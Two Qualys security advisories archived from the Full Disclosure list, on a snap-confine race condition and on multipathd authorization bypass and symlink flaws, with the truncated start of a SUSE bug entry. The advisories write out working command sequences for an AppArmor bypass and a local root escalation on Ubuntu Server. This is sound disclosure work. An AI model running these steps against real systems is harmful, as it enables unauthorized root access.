=== Content from seclists.org_0e3817b0_20250114_193136.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# Race condition in snap-confine's must\_mkdir\_and\_open\_with\_perms() (CVE-2022-3328)

---

*From*: Qualys Security Advisory via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Wed, 30 Nov 2022 23:32:12 +0000

---

```

Qualys Security Advisory

Race condition in snap-confine's must_mkdir_and_open_with_perms()
(CVE-2022-3328)

========================================================================
Contents
========================================================================

Summary
Background
Exploitation
Acknowledgments
Timeline

    I can't help but feel a missed opportunity to integrate lyrics from
    one of the best songs ever: [SNAP! - The Power (Official Video)]
        -- <https://twitter.com/spendergrsec/status/1494420041076461570>

========================================================================
Summary
========================================================================

We discovered a race condition (CVE-2022-3328) in snap-confine, a
SUID-root program installed by default on Ubuntu. In this advisory, we
tell the story of this vulnerability (which was introduced in February
2022 by the patch for CVE-2021-44731) and detail how we exploited it in
Ubuntu Server (a local privilege escalation, from any user to root) by
combining it with two vulnerabilities in multipathd (an authorization
bypass and a symlink attack, CVE-2022-41974 and CVE-2022-41973):

<https://www.qualys.com/2022/10/24/leeloo-multipath/leeloo-multipath.txt>

========================================================================
Background
========================================================================

    Like the crack of the whip, I Snap! attack
    Radical mind, day and night all the time
        -- SNAP! - The Power

In February 2022, we published CVE-2021-44731 in our "Lemmings" advisory
(<https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt>):
to set up a snap's sandbox, snap-confine created the temporary directory
/tmp/snap.$SNAP_NAME or reused it if it already existed, even if it did
not belong to root; a local attacker could race against snap-confine,
retain control over /tmp/snap.$SNAP_NAME, and eventually obtain full
root privileges.

This vulnerability was patched by commit acb2b4c ("cmd/snap-confine:
Prevent user-controlled race in setup_private_mount"), which introduced
a new helper function, must_mkdir_and_open_with_perms():

------------------------------------------------------------------------
142 static void setup_private_mount(const char *snap_name)
...
169         sc_must_snprintf(base_dir, sizeof(base_dir), "/tmp/snap.%s", snap_name);
...
176         base_dir_fd = must_mkdir_and_open_with_perms(base_dir, 0, 0, 0700);
------------------------------------------------------------------------
 55 static int must_mkdir_and_open_with_perms(const char *dir, uid_t uid, gid_t gid,
 56                                           mode_t mode)
 ..
 61  mkdir:
 ..
 67         if (mkdir(dir, 0700) < 0 && errno != EEXIST) {
 ..
 70         fd = open(dir, O_RDONLY | O_DIRECTORY | O_CLOEXEC | O_NOFOLLOW);
 ..
 81         if (fstat(fd, &st) < 0) {
 ..
 84         if (st.st_uid != uid || st.st_gid != gid
 85             || st.st_mode != (S_IFDIR | mode)) {
...
130                 if (rename(dir, random_dir) < 0) {
...
135                 goto mkdir;
------------------------------------------------------------------------

- the temporary directory /tmp/snap.$SNAP_NAME is created at line 67, if
  it does not exist already;

- if it already exists, and if it does not belong to root (at line 84),
  then it is moved out of the way (at line 130) by rename()ing it to a
  random directory in /tmp, and its creation is retried (at line 135).

When we reviewed this patch back in December 2021, we felt very nervous
about this rename() call (because it allows a local attacker to rename()
a directory they do not own), and we advised the Ubuntu Security Team to
either not reuse the directory /tmp/snap.$SNAP_NAME at all, or to create
it in a non-world-writable directory instead of /tmp, or at least to use
renameat2(RENAME_EXCHANGE) instead of rename(). Unfortunately, all of
these ideas were deemed impractical (for example, renameat2() is not
supported by older kernel and glibc versions); moreover, we (Qualys)
failed to come up with a feasible attack plan against this rename()
call, so the patch was kept in its current form.

After the release of Ubuntu 22.04 in April 2022, we decided to revisit
snap-confine and its recent hardening changes, and we finally found a
way to exploit the rename() call in must_mkdir_and_open_with_perms().

========================================================================
Exploitation
========================================================================

    It's getting, it's getting, it's getting kinda heavy
    It's getting, it's getting, it's getting kinda hectic
        -- SNAP! - The Power

The three key ideas to exploit the rename() of /tmp/snap.$SNAP_NAME are:

1/ snap-confine operates in /tmp to create a snap's temporary directory
(/tmp/snap.$SNAP_NAME in setup_private_mount()), but it also operates in
/tmp to create the snap's *root* directory (/tmp/snap.rootfs_XXXXXX in
sc_bootstrap_mount_namespace(), where all of the Xs are randomized by
mkdtemp()), and the string rootfs_XXXXXX is accepted as a valid snap
instance name by sc_instance_name_validate() (when all of the Xs are
lowercase alphanumeric):

------------------------------------------------------------------------
286 static void sc_bootstrap_mount_namespace(const struct sc_mount_config *config)
...
288         char scratch_dir[] = "/tmp/snap.rootfs_XXXXXX";
...
291         if (mkdtemp(scratch_dir) == NULL) {
...
303         sc_do_mount(scratch_dir, scratch_dir, NULL, MS_BIND, NULL);
...
319         sc_do_mount(config->rootfs_dir, scratch_dir, NULL, MS_REC | MS_BIND,
...
331         for (const struct sc_mount * mnt = config->mounts; mnt->path != NULL;
...
342                 sc_must_snprintf(dst, sizeof dst, "%s/%s", scratch_dir,
343                                  mnt->path);
...
352                         sc_do_mount(mnt->path, dst, NULL, MS_REC | MS_BIND,
------------------------------------------------------------------------

2/ We therefore execute two instances of snap-confine in parallel:

- we block the first snap-confine immediately after it creates its root
  directory /tmp/snap.rootfs_XXXXXX at line 291 (we reliably win this
  race condition by "single-stepping" snap-confine, as explained in our
  "Lemmings" advisory);

- we execute the second snap-confine with a snap instance name of
  rootfs_XXXXXX -- i.e., the temporary directory /tmp/snap.$SNAP_NAME of
  this second snap-confine is the root directory /tmp/snap.rootfs_XXXXXX
  of the first snap-confine;

- we kill this second snap-confine immediately after it rename()s its
  temporary directory /tmp/snap.$SNAP_NAME -- i.e., the root directory
  /tmp/snap.rootfs_XXXXXX of the first snap-confine -- at line 130 (we
  reliably win this race condition with inotify, as explained in our
  "Lemmings" advisory);

- we re-create the directory /tmp/snap.rootfs_XXXXXX ourselves, and
  resume the execution of the first snap-confine, whose root directory
  now belongs to us.

3/ We can therefore create an arbitrary symlink
/tmp/snap.rootfs_XXXXXX/tmp, and sc_bootstrap_mount_namespace() will
bind-mount the real /tmp directory (which is world-writable) onto any
directory in the filesystem (because mount() will follow our arbitrary
symlink at line 352).

This ability will eventually allow us to obtain full root privileges,
but we must first solve three problems:

------------------------------------------------------------------------
Problem a/ We cannot trick snap-confine into rename()ing
/tmp/snap.rootfs_XXXXXX, because this directory belongs to root and
must_mkdir_and_open_with_perms() rename()s it only if it does not belong
to root!

This problem solves itself naturally: indeed, /tmp/snap.rootfs_XXXXXX
belongs to the user root, but it belongs to the group of our own user,
so must_mkdir_and_open_with_perms() rename()s it because it does not
belong to the group root (at line 84).

------------------------------------------------------------------------
Problem b/ We cannot trick snap-confine into following our symlink
/tmp/snap.rootfs_XXXXXX/tmp, because sc_bootstrap_mount_namespace()
bind-mounts a read-only squashfs onto /tmp/snap.rootfs_XXXXXX (at line
319): if we create our symlink before this bind-mount, then it becomes
covered by the squashfs; and we cannot create our symlink after this
bind-mount, because the squashfs is read-only and belongs to root!

The "Prologue: CVE-2021-3996 and CVE-2021-3995 in util-linux's libmount"
of our "Lemmings" advisory suggests a solution to this problem: we must
unmount /tmp/snap.rootfs_XXXXXX each time sc_bootstrap_mount_namespace()
bind-mounts it (at lines 303 and 319). The "(deleted)" technique we used
in "Lemmings" (CVE-2021-3996 in util-linux) was patched in January 2022,
but we found a surprisingly simple workaround:

we mount a FUSE filesystem onto /tmp/snap.rootfs_XXXXXX, immediately
after we re-create this directory ourselves; this allows us to unmount
(with fusermount -u -z) any subsequent bind-mounts (even if they belong
to root), because fusermount does not check that our FUSE filesystem is
indeed the most recently mounted filesystem on /tmp/snap.rootfs_XXXXXX.

------------------------------------------------------------------------
Problem c/ We cannot trick snap-confine into bind-mounting the real /tmp
onto an arbitrary directory in the filesystem (at line 352), because
such a bind-mount is forbidden by snap-confine's AppArmor profile!

To solve this problem, we must bypass AppArmor completely, but the
technique we used in our "Lemmings" advisory (we wrapped snap-confine's
execution in an AppArmor profile that was in "complain" mode, not in
"enforce" mode) was patched in February 2022 (by commits 26eed65 and
4a2eb78, "ensure that snap-confine is in strict confinement" and
"Tighten AppArmor label check"):

now, snap-confine's execution must be wrapped in an AppArmor profile
that is in "enforce" mode and whose label matches the regular expression
"^(/snap/(snapd|core)/x?[0-9]+/usr/lib|/usr/lib(exec)?)/snapd/snap-confine$".

We were about to give up on trying to exploit snap-confine, when we
discovered CVE-2022-41974 and CVE-2022-41973 in multipathd (which is
installed by default on Ubuntu Server): these two vulnerabilities allow
us to create a directory named "failed_wwids" (user root, group root,
mode 0700) anywhere in the filesystem, and we were able to transform
this very limited directory creation into a complete AppArmor bypass.

AppArmor supports policy namespaces that are loosely related to kernel
user namespaces; by default, no AppArmor namespaces exist:

------------------------------------------------------------------------
$ ls -la /sys/kernel/security/apparmor/policy/namespaces
total 0
drwxr-xr-x 2 root root 0 Aug  6 12:42 .
drwxr-xr-x 5 root root 0 Aug  6 12:42 ..
------------------------------------------------------------------------

However, we (attackers) can create an AppArmor namespace "failed_wwids"
by exploiting CVE-2022-41974 and CVE-2022-41973 in multipathd:

------------------------------------------------------------------------
$ ln -s /sys/kernel/security/apparmor/policy/namespaces /dev/shm/multipath

$ multipathd list devices | grep 'whitelisted, unmonitored'
    sda1 devnode whitelisted, unmonitored
    ...

$ multipathd list list path sda1
fail

$ ls -la /sys/kernel/security/apparmor/policy/namespaces
total 0
drwxr-xr-x 3 root root 0 Aug  6 12:42 .
drwxr-xr-x 5 root root 0 Aug  6 12:42 ..
drwx------ 5 root root 0 Aug  6 13:38 failed_wwids
------------------------------------------------------------------------

Then, we can enter this AppArmor namespace by creating and entering an
unprivileged user namespace:

------------------------------------------------------------------------
$ aa-exec -n failed_wwids -p unconfined -- unshare -U -r /bin/sh
------------------------------------------------------------------------

Inside this namespace, we can create an AppArmor profile labeled
"/usr/lib/snapd/snap-confine" that is in "enforce" mode and allows all
possible operations:

------------------------------------------------------------------------
# apparmor_parser -K -a << "EOF"
/usr/lib/snapd/snap-confine (enforce) {
capability,
network,
mount,
remount,
umount,
pivot_root,
ptrace,
signal,
dbus,
unix,
file,
change_profile,
}
EOF
------------------------------------------------------------------------

Back in the initial namespace, we check that our "allow all" AppArmor
profile still exists:

------------------------------------------------------------------------
# aa-status
apparmor module is loaded.
32 profiles are loaded.
32 profiles are in enforce mode.
   ...
   :failed_wwids:/usr/lib/snapd/snap-confine
------------------------------------------------------------------------

Last, we make sure that snap-confine accepts our "allow all" AppArmor
profile (i.e., AppArmor is bypassed, and snap-confine is effectively
unconfined):

------------------------------------------------------------------------
$ env -i SNAPD_DEBUG=1 SNAP_INSTANCE_NAME=lxd aa-exec -n failed_wwids -p /usr/lib/snapd/snap-confine --
/usr/lib/snapd/snap-confine --base lxd snap.lxd.daemon /nonexistent
...
DEBUG: apparmor label on snap-confine is: /usr/lib/snapd/snap-confine
DEBUG: apparmor mode is: enforce
------------------------------------------------------------------------

We can therefore bind-mount /tmp onto an arbitrary directory in the
filesystem (by exploiting CVE-2022-3328); since we already depend on
multipathd to bypass AppArmor, we bind-mount /tmp onto /lib/multipath,
create our own shared library /lib/multipath/libchecktur.so, shutdown
multipathd (by exploiting CVE-2022-41974), restart multipathd (through
its Unix socket), and finally obtain full root privileges (because
multipathd executes our shared library as root when it restarts):

------------------------------------------------------------------------
$ grep multipath /proc/self/mountinfo | wc
      0       0       0

$ gcc -o CVE-2022-3328 CVE-2022-3328.c
$ ./CVE-2022-3328
scratch directory for constructing namespace: /tmp/snap.rootfs_0j4u9c

$ grep multipath /proc/self/mountinfo
1395 29 253:0 /tmp /usr/lib/multipath rw,relatime shared:1 - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
...

$ gcc -fpic -shared -o /lib/multipath/libchecktur.so libtmpsh.c

$ ps -ef | grep 'multipath[d]'
root         371       1  0 12:42 ?        00:00:00 /sbin/multipathd -d -s

$ multipathd list list add del switch sus resu rei fai resi rese rel forc dis rest paths maps path P map P gro P rec
dae statu stats top con bla dev raw wil quit
ok

$ ps -ef | grep 'multipath[d]' | wc
      0       0       0

$ ls -l /tmp/sh
ls: cannot access '/tmp/sh': No such file or directory

$ multipathd list daemon
error -104 receiving packet

$ ls -l /tmp/sh
-rwsr-xr-x 1 root root 125688 Aug  6 14:55 /tmp/sh

$ /tmp/sh -p
# id
uid=65534(nobody) gid=65534(nogroup) euid=0(root) groups=65534(nogroup)
                                     ^^^^^^^^^^^^
------------------------------------------------------------------------

========================================================================
Acknowledgments
========================================================================

We thank the Ubuntu security team (Alex Murray and Seth Arnold in
particular) and the snapd team for their hard work on this snap-confine
vulnerability. We also thank the members of linux-distros@openwall.

========================================================================
Timeline
========================================================================

2022-08-23: Contacted security@ubuntu.

2022-11-28: Contacted linux-distros@openwall.

2022-11-30: Coordinated Release Date (17:00 UTC).
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

### Current thread:

* **Race condition in snap-confine's must\_mkdir\_and\_open\_with\_perms() (CVE-2022-3328)** *Qualys Security Advisory via Fulldisclosure (Dec 08)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_542c0eec_20250114_193137.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

![](/shared/images/nst-icons.svg#search)

# Authorization bypass and symlink attack in multipathd (CVE-2022-41974 and CVE-2022-41973)

---

*From*: Qualys Security Advisory via Fulldisclosure <fulldisclosure () seclists org>

*Date*: Mon, 24 Oct 2022 15:18:41 +0000

---

```

Qualys Security Advisory

Leeloo Multipath: Authorization bypass and symlink attack in multipathd
(CVE-2022-41974 and CVE-2022-41973)

========================================================================
Contents
========================================================================

Summary
CVE-2022-41974: Authorization bypass
CVE-2022-41973: Symlink attack
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

We discovered two local vulnerabilities (an authorization bypass and a
symlink attack) in multipathd, a daemon that is running as root in the
default installation of (for example) Ubuntu Server:

<https://ubuntu.com/server/docs/device-mapper-multipathing-introduction>
<https://github.com/opensvc/multipath-tools>

We combined these two vulnerabilities with a third vulnerability, in
another package that is also installed by default on Ubuntu Server, and
obtained full root privileges on Ubuntu Server 22.04; other releases are
probably also exploitable. We will publish this third vulnerability, and
the complete details of this local privilege escalation, in an upcoming
advisory.

The authorization bypass (CVE-2022-41974) was introduced in February
2017 (version 0.7.0) by commit 9acda0c ("Perform socket client uid check
on IPC commands"), but earlier versions perform no authorization checks
at all: any unprivileged local user can issue any privileged command to
multipathd.

The symlink attack (CVE-2022-41973) was introduced in May 2018 (version
0.7.7) by commit 65d0a63 ("functions to indicate mapping failure in
/dev/shm"); the vulnerable code was hardened significantly in May 2020
(version 0.8.5) by commit 40ee3ea ("simplify failed wwid code"), but it
remains exploitable nonetheless.

========================================================================
CVE-2022-41974: Authorization bypass
========================================================================

The multipathd daemon listens for client connections on an abstract Unix
socket (conveniently, the multipathd binary itself can act as a client,
if executed with non-option arguments; we use this feature extensively
in this advisory to connect and send commands to the multipathd daemon):

------------------------------------------------------------------------
$ ps -ef | grep 'multipath[d]'
root         377       1  0 13:55 ?        00:00:00 /sbin/multipathd -d -s

$ ss -l -x | grep 'multipathd'
u_str LISTEN 0      4096        @/org/kernel/linux/storage/multipathd 18105
------------------------------------------------------------------------

The commands sent by a client to multipathd are composed of keywords,
and internally, each keyword is identified by a different bit; for
example, "list" is 1 (1<<0), "add" is 2 (1<<1), and "path" (which
requires a parameter) is 65536 (1<<16):

------------------------------------------------------------------------
155 load_keys (void)
...
163         r += add_key(keys, "list", LIST, 0);
164         r += add_key(keys, "show", LIST, 0);
165         r += add_key(keys, "add", ADD, 0);
...
183         r += add_key(keys, "path", PATH, 1);
------------------------------------------------------------------------
 53 #define LIST            (1ULL << __LIST)
 54 #define ADD             (1ULL << __ADD)
 ..
 69 #define PATH            (1ULL << __PATH)
------------------------------------------------------------------------
  6 enum {
  7         __LIST,                 /*  0 */
  8         __ADD,
 ..
 23         __PATH,
------------------------------------------------------------------------

In turn, each command is associated with a handler (a C function) by its
fingerprint -- the bitwise OR of its constituent keywords; for example,
the command "list path PARAM" is associated with cli_list_path() by the
fingerprint 65537 (LIST+PATH=1+65536), and the command "add path PARAM"
is associated with cli_add_path() by the fingerprint 65538
(ADD+PATH=2+65536):

------------------------------------------------------------------------
1522 void init_handler_callbacks(void)
....
1527         set_handler_callback(LIST+PATH, cli_list_path);
....
1549         set_handler_callback(ADD+PATH, cli_add_path);
------------------------------------------------------------------------
321 static uint64_t
322 fingerprint(const struct _vector *vec)
...
325         uint64_t fp = 0;
...
331         vector_foreach_slot(vec, kw, i)
332                 fp += kw->code;
333
334         return fp;
------------------------------------------------------------------------
 89 static struct handler *
 90 find_handler (uint64_t fp)
 ..
 95         vector_foreach_slot (handlers, h, i)
 96                 if (h->fingerprint == fp)
 97                         return h;
 98
 99         return NULL;
------------------------------------------------------------------------

When multipathd receives a command from a client, it first performs an
authentication check and an authorization check (both at line 491):

------------------------------------------------------------------------
431 static int client_state_machine(struct client *c, struct vectors *vecs,
...
485         case CLT_PARSE:
486                 c->error = parse_cmd(c);
487                 if (!c->error) {
...
491                         if (!c->is_root && kw->code != LIST) {
492                                 c->error = -EPERM;
...
495                         }
496                 }
497                 if (c->error)
...
501                 else
502                         set_client_state(c, CLT_WORK);
...
522         case CLT_WORK:
523                 c->error = execute_handler(c, vecs);
------------------------------------------------------------------------

- Authentication: if the client's UID (obtained from SO_PEERCRED) is 0
  (i.e., if is_root is true), then the client is privileged; otherwise,
  it is unprivileged.

- Authorization: if the client is privileged, it is allowed to execute
  any commands; otherwise, only unprivileged LIST commands are allowed
  (i.e., commands whose first keyword is either "list" or "show").

Attentive readers may have noticed that multipathd does not, in fact,
calculate the fingerprint of a command by bitwise-ORing its constituent
keywords, but by arithmetic-ADDing them (at line 332). While these two
operations are equivalent if no keyword is repeated, we (attackers) can
send a seemingly unprivileged command (whose first keyword is "list")
but whose fingerprint matches a privileged command (by repeating the
"list" keyword): we can exploit this flaw to bypass multipathd's
authorization check.

For example, we are not allowed to execute "add path PARAM" (whose
fingerprint is 2+65536=65538) because the first keyword is not "list",
but we are allowed to execute the equivalent "list list path PARAM"
(whose fingerprint is also 1+1+65536=65538, instead of 1|1|65536=65537)
because the first keyword is "list" (the multipathd daemon below replies
"blacklisted" because PARAM is an invalid path, not because the command
is denied):

------------------------------------------------------------------------
$ multipathd add path PARAM
permission deny: need to be root

$ multipathd list list path PARAM
blacklisted
------------------------------------------------------------------------

This authorization bypass greatly enlarges the attack surface of
multipathd: 34 privileged command handlers become available to local
attackers, in addition to the 23 unprivileged command handlers that are
normally available. We audited only a few of these command handlers,
because we quickly discovered a low-hanging vulnerability (a symlink
attack) in one of them.

========================================================================
CVE-2022-41973: Symlink attack
========================================================================

multipathd operates insecurely, as root, in /dev/shm (a sticky,
world-writable directory similar to /tmp). The vulnerable code (in
mark_failed_wwid()) may be executed during the normal lifetime of
multipathd, but a local attacker can force its execution by exploiting
the authorization bypass CVE-2022-41974; for example, by adding a
"whitelisted, unmonitored" device to multipathd:

------------------------------------------------------------------------
$ multipathd list devices | grep 'whitelisted, unmonitored'
    sda1 devnode whitelisted, unmonitored
    ...

$ multipathd list list path sda1
fail
------------------------------------------------------------------------

This command, which is equivalent to "add path sda1", results in the
following system-call trace (strace) of the multipathd daemon:

------------------------------------------------------------------------
386 openat(AT_FDCWD, "/dev/shm/multipath/failed_wwids", O_RDONLY|O_DIRECTORY) = -1 ENOENT (No such file or directory)
387 mkdir("/dev", 0700)                     = -1 EEXIST (File exists)
388 mkdir("/dev/shm", 0700)                 = -1 EEXIST (File exists)
389 mkdir("/dev/shm/multipath", 0700)       = 0
390 mkdir("/dev/shm/multipath/failed_wwids", 0700) = 0
391 openat(AT_FDCWD, "/dev/shm/multipath/failed_wwids", O_RDONLY|O_DIRECTORY) = 12
392 getpid()                                = 375
393 openat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", O_RDONLY|O_CREAT|O_EXCL, 0400) = 13
394 close(13)                               = 0
395 linkat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", 12, "VBOX_HARDDISK_VB60265ca5-df119cb6", 0) = 0
396 unlinkat(12, "VBOX_HARDDISK_VB60265ca5-df119cb6.177", 0) = 0
397 close(12)                               = 0
------------------------------------------------------------------------

- at line 389, the directory "/dev/shm/multipath" is created, if it does
  not exist already;

- at line 390, the directory "/dev/shm/multipath/failed_wwids" is
  created, if it does not exist already;

- at lines 391-397, the empty file
  "/dev/shm/multipath/failed_wwids/VBOX_HARDDISK_VB60265ca5-df119cb6" is
  created, if it does not exist already (its name is the "World Wide ID"
  of the added device).

multipathd is therefore vulnerable to two different symlink attacks:

1/ if we (attackers) create an arbitrary symlink "/dev/shm/multipath",
then we can create a directory named "failed_wwids" (user root, group
root, mode 0700) anywhere in the filesystem;

2/ if we create an arbitrary symlink "/dev/shm/multipath/failed_wwids",
then we can create a file named "VBOX_HARDDISK_VB60265ca5-df119cb6"
(user root, group root, mode 0400, size 0) anywhere in the filesystem.

These two symlink attacks are very weak, because we do not control the
name, user, group, mode, or contents of the directory or file that we
create; only its location. Despite these limitations, we were able to
combine multipathd's vulnerabilities (authorization bypass and symlink
attack) with a third vulnerability (in another package), and obtained
full root privileges on Ubuntu Server 22.04; we will publish this third
vulnerability in an upcoming advisory.

Side note: initially, we thought that the symlink attack 1/ would fail,
because /dev/shm is a sticky world-writable directory, and the kernel's
fs.protected_symlinks is 1 by default; to our great surprise, however,
it succeeded. Eventually, we understood that only the final component of
a path is protected, not its intermediate components; for example, if
/tmp/foo is a symlink, then an access to /tmp/foo itself is protected,
but an access to /tmp/foo/bar is not. Interestingly, this weakness was
already pointed out in 2017 by Solar Designer, and the original
Openwall, grsecurity, and Yama protections are not affected:

<https://www.openwall.com/lists/kernel-hardening/2017/06/06/74>

========================================================================
Acknowledgments
========================================================================

We thank Martin Wilck and Benjamin Marzinski for their hard work on this
release, and the SUSE Security Team for their help with this disclosure.
We also thank the members of linux-distros@openwall.

========================================================================
Timeline
========================================================================

2022-08-24: Advisory sent to security@suse.

2022-10-10: Advisory and patches sent to linux-distros@openwall.

2022-10-24: Coordinated Release Date (15:00 UTC).
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

### Current thread:

* **Authorization bypass and symlink attack in multipathd (CVE-2022-41974 and CVE-2022-41973)** *Qualys Security Advisory via Fulldisclosure (Oct 30)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from bugzilla.suse.com_13795e8b_20250114_193139.html ===


| Bugzilla – Bug 1202739 | VUL-0: CVE-2022-41973,CVE-2022-41974: multipath-tools: multipathd: authorization bypass and symlink attack "Leeloo Multipath" | Last modified: 2024-04-19 12:41:58 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D1202739)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

[**Bug 1202739**](show_bug.cgi?id=1202739)
(CVE-2022-41973)
- VUL-0: CVE-2022-41973,CVE-2022-41974: multipath-tools: multipathd: authorization bypass and symlink attack "Leeloo Multipath"

[Summary:](page.cgi?id=glossary.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
VUL-0: CVE-2022-41973,CVE-2022-41974: multipath-tools: multipathd: authorizat...

| | [Status](page.cgi?id=status_resolution_matrix.html): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=glossary.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2022-41973 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | SUSE Security Incidents | | [Classification:](page.cgi?id=glossary.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Novell Products | | [Component:](describecomponents.cgi?product=SUSE Security Incidents "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Incidents ([show other bugs](buglist.cgi?component=Incidents&product=SUSE%20Security%20Incidents&bug_status=__open__)) | | [Version:](page.cgi?id=glossary.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=glossary.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Other Other | |  | | | [Priority](page.cgi?id=glossary.html#priority): | P3 - Medium **Severity**: Normal | | [Target 